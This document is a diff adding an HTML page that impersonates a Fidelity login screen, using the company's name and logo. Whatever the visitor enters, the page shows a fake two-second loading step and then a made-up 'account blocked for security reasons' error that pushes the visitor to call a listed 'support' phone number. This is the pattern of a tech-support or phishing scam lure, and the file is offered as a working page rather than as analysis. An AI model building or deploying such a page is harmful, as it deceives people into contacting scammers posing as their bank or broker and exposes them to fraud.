@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fidelity Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+            flex-direction: column;
+        }
+
+        header {
+            width: 100%;
+            background-color: #ffffff;
+            padding: 15px 20px;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: absolute;
+            top: 0;
+        }
+
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            align-items: center;
+        }
+
+        .header-links a {
+            text-decoration: none;
+            color: #4B4B4B;
+            margin-left: 20px;
+            margin-right: 20px;
+        }
+
+        .header-links a:hover {
+            text-decoration: underline;
+        }
+
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            margin-top: 60px;
+        }
+
+        .container h2 {
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input[type="checkbox"] {
+            margin-right: 10px;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #28a745;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .login-btn:hover {
+            background-color: #218838;
+        }
+
+        .forgot-password {
+            display: block;
+            margin-top: 15px;
+            text-align: left;
+        }
+
+        .forgot-password a {
+            color: black;
+            text-decoration: underline;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-link {
+            margin-top: 20px;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .signup-link a {
+            color: black;
+            text-decoration: underline;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .error {
+            color: red;
+            margin-bottom: 10px;
+            font-size: 14px;
+            background-color: #f8d7da;
+            padding: 10px;
+            border: 1px solid #f5c6cb;
+            border-radius: 5px;
+            text-align: left;
+        }
+
+        .error a {
+            color:  #155724;
+            text-decoration: none;
+            background-color: #f8d7da;
+            padding: 10px 15px;
+            border-radius: 5px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+
+        .error a:hover {
+            text-decoration: underline;
+        }
+
+        /* Loading animation styles */
+        #loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 600px) {
+            header {
+                padding: 10px 15px;
+            }
+
+            .header-links a {
+                margin-left: 10px;
+                margin-right: 10px;
+            }
+
+            .container {
+                padding: 20px;
+            }
+
+            .login-btn {
+                padding: 10px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-container">
+            <div class="logo">
+                <img src="fidelity-vector-logo-small.png" alt="Fidelity Logo" style="width: 150px;">
+            </div>
+            <div class="header-links">
+                <a href="#">Security</a>
+                <a href="#">FAQs</a>
+            </div>
+        </div>
+    </header>
+
+    <div class="container" id="login-container">
+        <h2>Log in</h2>
+        <form id="loginForm">
+            <div id="error-message" class="error" style="display:none;"></div> <!-- Moved above username -->
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" placeholder="Username">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password">
+            </div>
+            <div class="form-group">
+                <input type="checkbox" id="remember" name="remember">
+                <label for="remember">Remember my username</label>
+            </div>
+            <button type="submit" class="login-btn">Log in</button>
+            <div class="forgot-password">
+                <a href="#">Forgot username or password?</a>
+            </div>
+        </form>
+    </div>
+
+    <div id="loading">
+        <img src="loading new gif.gif" alt="Loading" width="80" height="80">
+        <h3>Loading...</h3>
+    </div>
+
+    <div class="signup-link">
+        New to Fidelity? <a href="#">Open an account or sign up.</a>
+    </div>
+
+    <script>
+        // Save username to localStorage if "Remember my username" is checked
+        function saveUsername() {
+            const username = document.getElementById('username').value;
+            const remember = document.getElementById('remember').checked;
+
+            if (remember) {
+                localStorage.setItem('rememberedUsername', username);
+            } else {
+                localStorage.removeItem('rememberedUsername');
+            }
+        }
+
+        // Populate the username field if remembered
+        function loadRememberedUsername() {
+            const rememberedUsername = localStorage.getItem('rememberedUsername');
+            if (rememberedUsername) {
+                document.getElementById('username').value = rememberedUsername;
+                document.getElementById('remember').checked = true;
+            }
+        }
+
+        // Show error message on login attempt
+        function showErrorMessage() {
+            const errorMessage = document.getElementById('error-message');
+            errorMessage.style.display = 'block';
+            errorMessage.innerHTML = 'Error Code : 00X47800. <br> Your account has been blocked due to security reasons. <br> Contact Support: <a href="tel:+18332034855"><h3 style="color:black;">+1-833-203-4855</h3></a>';
+        }
+
+        // Show loading animation
+        function showLoading() {
+            document.getElementById('login-container').style.display = 'none'; // Hide the form
+            document.getElementById('loading').style.display = 'block'; // Show loading animation
+        }
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Show loading animation
+            showLoading();
+
+            // Simulate a delay (e.g., a network request)
+            setTimeout(function() {
+                showErrorMessage(); // Show the error message after 2 seconds
+                document.getElementById('loading').style.display = 'none'; // Hide loading animation
+                document.getElementById('login-container').style.display = 'block'; // Show the form again
+            }, 2000);
+
+            // Save the username if "Remember" is checked
+            saveUsername();
+        });
+
+        // Load remembered username on page load
+        window.onload = function() {
+            loadRememberedUsername();
+        };
+    </script>
+</body>
+</html>
